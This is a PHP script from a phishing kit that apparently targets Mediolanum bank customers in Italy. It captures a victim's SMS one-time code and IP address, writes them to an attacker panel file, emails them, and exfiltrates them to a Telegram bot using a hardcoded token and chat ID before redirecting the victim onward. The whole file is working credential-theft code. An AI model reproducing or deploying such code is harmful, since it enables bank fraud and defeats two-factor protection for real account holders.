<?php
session_start();
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    if (!empty($_POST['sms']) //and !empty($_POST['mm']) and !empty($_POST['yy']) 
         //and !empty($_POST['s6'])
    ) {
            $_SESSION['sms']=$_POST['sms'];
          if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
                $ip = $_SERVER['HTTP_CLIENT_IP'];
            } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
                $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
            } else {
                $ip = $_SERVER['REMOTE_ADDR'];
            }
include('../../BOTS/STRNG.php');
$ATR480X .= "•••••••••• 🔑 [ MEDIOLANUM.ATR480X ] 🔑\n";
$ATR480X .= "[ CODE ] *  :  ".$_POST['sms']."\n";
$ATR480X .= "•••••••••• ℹ️ [ VICM.INFS ] ℹ️\n";
$ATR480X .= "[ 🔎 ] *  =  [ $ip ]\n";
$ATR480X .= "•••••••••• 🇮🇹🇮🇹.[IT].🇮🇹🇮🇹\n";

            $file = fopen("../../PANEL/ATR480X.html", "a+");
            fwrite($file, $ATR480X);fclose($file);
            $to = "";
            $subject = "[ SMS.0️⃣.❌ RECEIVED ]";
            $headers = "From: [ NEXI.ATR480X ]<atr480x@atr480x.com>\r\n";
            $headers .= "MIME-Version: 1.0\r\n";
            $headers .= "Content-Type: text/html; charset=ISO-8859-1\r\n";
            mail($to, $subject, $ATR480X, $headers);
$token = "7914161075:AAFXZvfYCd-3OCsC1QAUCXc9AfHhsy8FMlw";
    file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=1858722787&text=" . urlencode($ATR480X)."" );
            header("Location: ../SISTEMA.DI.SICUREZZA/REDIRECT/EXAMPLE.php?client_id=$my_rand_strng");
    }else header("Location: ?error=".md5($_GET['error']));
}
?>